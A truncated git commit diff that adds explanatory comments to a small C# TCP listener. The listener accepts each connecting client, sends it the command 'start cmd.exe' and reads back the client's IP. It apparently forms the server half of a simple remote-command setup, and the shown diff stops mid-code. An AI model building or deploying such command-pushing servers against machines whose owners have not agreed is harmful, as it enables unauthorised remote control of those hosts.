c3759435f8430e42df1762ff8e8cb4d3d4c61141
Glicy <Ludovic2008@outlook.com>
2024-11-26 20:10:44 +0100

    more commentars
    more commentars

--- TCPListener/TCPListener/Program.cs
+++ TCPListener/TCPListener/Program.cs
@@ -13,28 +13,34 @@ namespace TCPListener
 
             try
             {
+                // Initialisation
                 byte[] clientIp = new byte[256];
                 int numberIpBytes = 0;
                 int port = 13000;
                 string ip = string.Empty;
                 IPAddress localIp = IPAddress.Parse("192.168.1.172");
 
+                // Build the server
                 server = new TcpListener(localIp, port);
                 server.Start();
 
                 TcpClient client = null;
                 NetworkStream stream = null;
 
-
+                // Do it for each client that connected
                 while (true)
                 {
                     client = server.AcceptTcpClient();
                     stream = client.GetStream();
 
-                    byte[] bytes = System.Text.Encoding.ASCII.GetBytes("start cmd.exe");
+                    // Transform command into bytes and puts it in the stream
+                    string command = "start cmd.exe";
+                    byte[] bytes = System.Text.Encoding.ASCII.GetBytes(command);
+
                     stream.Write(bytes, 0, bytes.Length);
                     Console.WriteLine("Message sent !");
 
+                    // Get IP and create file but only if an IP has been returned
                     numberIpBytes = stream.Read(clientIp, 0, clientIp.Length);
 
                     if (numberIpBytes != 0)
